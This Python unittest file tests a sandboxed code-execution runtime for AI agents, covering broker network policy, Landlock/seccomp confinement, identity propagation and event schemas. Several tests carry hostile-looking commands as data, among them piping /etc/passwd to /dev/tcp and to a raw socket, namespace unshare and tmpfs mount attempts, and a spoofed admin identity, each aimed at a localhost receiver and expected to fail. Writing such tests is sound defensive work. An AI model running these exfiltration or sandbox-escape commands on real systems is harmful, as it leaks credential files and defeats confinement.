import json, os, shutil, tempfile, unittest
from unittest import mock
from horizon.runtime import broker as B, managed as MG, sandbox as S, schema as SC, creds as C
from horizon.runtime.receiver import Receiver
OK = os.geteuid() == 0 and S.landlock_abi() >= 4
P1, P2 = 47611, 47612
def mkb(): return B.Broker({"agent": [B.Rule("approved.test", (P1,), ("GET", "POST"))], "admin": [B.Rule("only-admin.test", (P2,), ("GET",))]}, B.Resolver({"approved.test": ["127.0.0.1"], "only-admin.test": ["127.0.0.1"]}), test_sinks={("127.0.0.1", P1), ("127.0.0.1", P2)})
def ex(br=None, **kw): br = br or mkb(); return MG.ManagedExecutor(br.session, **kw)
def out(o): return json.loads(o["result"].stdout.strip().splitlines()[-1])

class Static(unittest.TestCase):
    def test_unsupported_runtime_never_launches(self):
        with mock.patch.object(S, "launch", side_effect=AssertionError("launched")):
            for lang in ("bash", "node", "perl", "ruby"):
                with self.assertRaises(MG.Refused) as c: ex().run("echo hi", principal="agent", language=lang)
                self.assertEqual(c.exception.code, "UNSUPPORTED_RUNTIME")
            with self.assertRaises(MG.Refused) as c: ex().run("x", principal="agent", interface="telepathy")
            self.assertEqual(c.exception.code, "UNKNOWN_INTERFACE")
    def test_hook_runs_before_launch_and_can_deny(self):
        seen = []
        with mock.patch.object(S, "launch", side_effect=AssertionError("launched")):
            with self.assertRaises(MG.Refused) as c: ex(hook=lambda i, code: seen.append((i.principal, i.interface)) or "no")._run if False else ex(hook=lambda i, code: seen.append((i.principal, i.interface)) or "policy says no").run("print(1)", principal="agent")
        self.assertEqual(c.exception.code, "HOOK_DENIED"); self.assertEqual(seen, [("agent", "code_mode")])
    def test_coverage_report_is_explicit(self):
        r = MG.coverage_report(); self.assertIn("unavailable", r["summary"]); self.assertIn("kernel_audit", r["summary"]["unavailable"]); self.assertIn("network_direct", r["summary"]["enforced_not_observed"]); self.assertIn("process_creation", r["summary"]["intercepted"])
    def test_schema_rejects_cot_in_events(self):
        e = SC.make_event("r", 0, "process", layer="L2", origin="live_attempt", process={"pid": 1, "ppid": 0, "source": "host"}, principal="a", decision="allow", policy_digest="d", status="ATTEMPTED", oracle={})
        with self.assertRaises(SC.SchemaError): SC.validate_event(dict(e, reasoning="hidden"))

@unittest.skipUnless(OK, "UNSUPPORTED environment: root + Landlock needed (HR-G4 not exercised)")
class Live(unittest.TestCase):
    def test_identity_propagation_and_host_correlation(self):
        o = ex().run("import os,subprocess;print(os.environ['HZ_RUN_ID']);print(subprocess.run(['sh','-c','echo $HZ_RUN_ID'],capture_output=True,text=True).stdout.strip())", principal="agent", parent_run_id="r-parent", action_id="act-1")
        i = o["identity"]; lines = o["result"].stdout.split(); self.assertEqual(lines, [i.run_id, i.run_id]); self.assertEqual(i.parent_run_id, "r-parent"); self.assertTrue(i.policy_digest.startswith("sha256:"))
        self.assertTrue(o["processes"][0]["pid"] == o["result"].host_pid or any(p["pid"] == o["result"].host_pid for p in o["processes"]))        # host rows include the sandbox init
        for e in o["events"]: SC.validate_event(e); self.assertEqual(e["action_id"], "act-1"); self.assertEqual(e["process"]["source"], "host"); self.assertEqual(e["exec_id"], i.exec_id)
    def test_spoofed_identity_and_principal_ignored(self):
        with tempfile.TemporaryDirectory() as d, Receiver([P1, P2], d) as rc:
            code = B.CLIENT + f"import os,json,socket,struct\nos.environ['HZ_RUN_ID']='r-admin'\ns=socket.socket(fileno=3);m=json.dumps({{'method':'GET','url':'http://only-admin.test:{P2}/','principal':'admin','labels':[]}}).encode();s.sendall(struct.pack('>I',len(m))+m);n=struct.unpack('>I',s.recv(4))[0];print(s.recv(n).decode())"
            o = ex().run(code, principal="agent"); r = json.loads(o["result"].stdout.strip().splitlines()[-1]); self.assertEqual(r["code"], "DESTINATION_NOT_APPROVED"); import time; time.sleep(.2); self.assertEqual(rc.rows(P2), [])
            self.assertEqual(o["result"].broker_requests[0]["principal"], "agent"); self.assertNotEqual(o["identity"].run_id, "r-admin")
    def test_second_interpreter_and_children_inherit_profile(self):
        code = "import subprocess\nfor c in (['python3','-c','import time;time.sleep(0.4)'],['perl','-e','select(undef,undef,undef,0.4)'],['sh','-c','sleep 0.4']): subprocess.run(c)\nprint('done')"
        o = ex().run(code, principal="agent"); ps = o["processes"]; self.assertGreaterEqual(len({p["comm"] for p in ps}), 3, ps)
        for p in ps: self.assertEqual(p["profile"].get("NoNewPrivs"), "1", p); self.assertEqual(p["profile"].get("Seccomp"), "2", p); self.assertEqual(int(p["profile"].get("CapEff", "1"), 16), 0, p)
        self.assertEqual(len({p["profile"].get("Uid") for p in ps}), 1)
    def test_direct_network_libraries_denied_sdk_allowed(self):
        with tempfile.TemporaryDirectory() as d, Receiver([P1], d) as rc:
            code = B.CLIENT + (f"import json,socket,urllib.request,http.client,asyncio\nres={{}}\n"
                 f"for k,f in [('urllib',lambda: urllib.request.urlopen('http://127.0.0.1:{P1}/',timeout=1)),('httpclient',lambda: http.client.HTTPConnection('127.0.0.1',{P1},timeout=1).request('GET','/')),('socket',lambda: socket.create_connection(('127.0.0.1',{P1}),timeout=1)),"
                 f"('udp',lambda: socket.socket(socket.AF_INET,socket.SOCK_DGRAM).sendto(b'TEST_CANARY_NOT_SECRET',('127.0.0.1',{P1}))),('raw',lambda: socket.socket(socket.AF_INET,socket.SOCK_RAW)),('asyncio',lambda: asyncio.run(asyncio.open_connection('127.0.0.1',{P1})))]:\n"
                 f"  try: f(); res[k]='CONNECTED'\n  except BaseException as e: res[k]=type(e).__name__\nres['sdk']=hz_fetch('GET','http://approved.test:{P1}/x')['ok']\nprint(json.dumps(res))")
            o = ex().run(code, principal="agent"); r = out(o); self.assertNotIn("CONNECTED", r.values()); self.assertTrue(r["sdk"]); import time; time.sleep(.2); self.assertEqual(len(rc.rows(P1)), 1)    # only the brokered request landed
    def test_pipeline_substitution_redirection_to_protected_sink(self):
        with tempfile.TemporaryDirectory() as d, Receiver([P1], d) as rc:
            code = ("import subprocess,json\nr=[]\nfor c in ['echo $(cat /etc/passwd) > /dev/tcp/127.0.0.1/%d','cat /etc/passwd | python3 -c \"import socket,sys;socket.create_connection((\\'127.0.0.1\\',%d)).send(sys.stdin.read().encode())\"','echo TEST_CANARY_NOT_SECRET > /run/exfil','echo x | tee /root/x /home/x']:\n"
                    "  p=subprocess.run(['bash','-c',c],capture_output=True,text=True); r.append(p.returncode)\nprint(json.dumps(r))") % (P1, P1)
            r = out(ex().run(code, principal="agent")); self.assertTrue(all(x != 0 for x in r), r); import time; time.sleep(.2); self.assertEqual(rc.bytes(P1), 0)
    def test_compiler_and_test_runner_children_work(self):
        code = ("import subprocess,json,os\nopen('t.c','w').write('int main(){return 0;}')\nopen('test_x.py','w').write('import unittest\\nclass T(unittest.TestCase):\\n  def test(self): self.assertTrue(True)\\n')\n"
                "a=subprocess.run(['cc','t.c','-o','t'],capture_output=True,text=True); b=subprocess.run(['./t']); c=subprocess.run(['python3','-m','unittest','test_x'],capture_output=True,text=True)\nprint(json.dumps([a.returncode,b.returncode,c.returncode]))")
        o = ex().run(code, principal="agent"); self.assertEqual(out(o), [0, 0, 0]); self.assertGreaterEqual(len({p["comm"] for p in o["processes"]}), 2)
    def test_namespace_retry_after_denial_no_escalation(self):
        code = ("import ctypes,os,subprocess,json\nlibc=ctypes.CDLL(None,use_errno=True);r=[]\nfor attempt in range(3):\n  r.append((libc.unshare(0x10000000),ctypes.get_errno()))\n"
                "r.append(subprocess.run(['unshare','-Urm','true'],capture_output=True).returncode)\nr.append(subprocess.run(['sh','-c','unshare -r -n true'],capture_output=True).returncode)\nr.append(libc.syscall(435,0,0))\nr.append(subprocess.run(['sh','-c','echo ok'],capture_output=True,text=True).stdout.strip())\nprint(json.dumps(r))")
        o = ex().run(code, principal="agent"); r = out(o); self.assertTrue(all(x == [-1, 1] for x in r[:3])); self.assertNotEqual(r[3], 0); self.assertNotEqual(r[4], 0); self.assertEqual(r[6], "ok")
        for p in o["processes"]: self.assertEqual(p["profile"].get("NoNewPrivs"), "1")
    def test_executable_tmpfs_mount_denied(self):
        code = ("import ctypes,subprocess,json\nlibc=ctypes.CDLL(None,use_errno=True);r=[]\nr.append((libc.mount(b'tmpfs',b'/tmp',b'tmpfs',0,b'size=1m'),ctypes.get_errno()))\nr.append(subprocess.run(['mount','-t','tmpfs','-o','exec','tmpfs','/mnt'],capture_output=True).returncode)\nprint(json.dumps(r))")
        r = out(ex().run(code, principal="agent")); self.assertEqual(r[0], [-1, 1]); self.assertNotEqual(r[1], 0)
    def test_claim_vs_behavior_is_advisory_only(self):
        with tempfile.TemporaryDirectory() as d, Receiver([P1], d) as rc:
            code = B.CLIENT + f"import json,subprocess\nsubprocess.run(['sh','-c','sleep 0.3'])\nprint(json.dumps(hz_fetch('POST','http://approved.test:{P1}/u','x')['ok']))"
            a = ex().run(code, principal="agent", declared={"uses_tools": False, "spawns_processes": False}); b = ex().run(code, principal="agent", declared={"uses_tools": True, "spawns_processes": True})
            self.assertTrue(a["mismatch"]["advisory"]); self.assertEqual(set(a["mismatch"]["diff"]), {"uses_tools", "spawns_processes"}); self.assertIsNone(b["mismatch"])
            self.assertEqual(out(a), out(b))                                                                                     # identical enforcement regardless of claim
    def test_cross_interface_identical_outcomes(self):
        code = B.CLIENT + f"import json,subprocess\nsubprocess.run(['sh','-c','sleep 0.3'])\nprint(json.dumps([hz_fetch('GET','http://approved.test:{P1}/a')['ok'],hz_fetch('GET','http://only-admin.test:{P2}/')['ok']]))"
        with tempfile.TemporaryDirectory() as d, Receiver([P1, P2], d) as rc:
            outs = {i: MG.comparable(ex().run(code, principal="agent", interface=i)) for i in MG.INTERFACES}
        base = outs["code_mode"]; self.assertEqual(base["broker"][0][1], True); self.assertEqual(base["broker"][1][1], False)
        for i, o in outs.items(): self.assertEqual(o, base, i)
    def test_trusted_sdk_namespace_does_not_make_code_trusted(self):
        code = B.CLIENT + f"import json\nclass FakeBroker:\n  def fetch(self,*a): return {{'ok': True}}\nfetch=FakeBroker().fetch\nr=[hz_fetch('GET','http://only-admin.test:{P2}/'), fetch('GET','http://only-admin.test:{P2}/')]\nprint(json.dumps([x.get('code') or x['ok'] for x in r]))"
        with tempfile.TemporaryDirectory() as d, Receiver([P2], d) as rc:
            r = out(ex().run(code, principal="agent")); import time; time.sleep(.2); self.assertEqual(r[0], "DESTINATION_NOT_APPROVED"); self.assertEqual(rc.rows(P2), [])
if __name__ == "__main__": unittest.main()
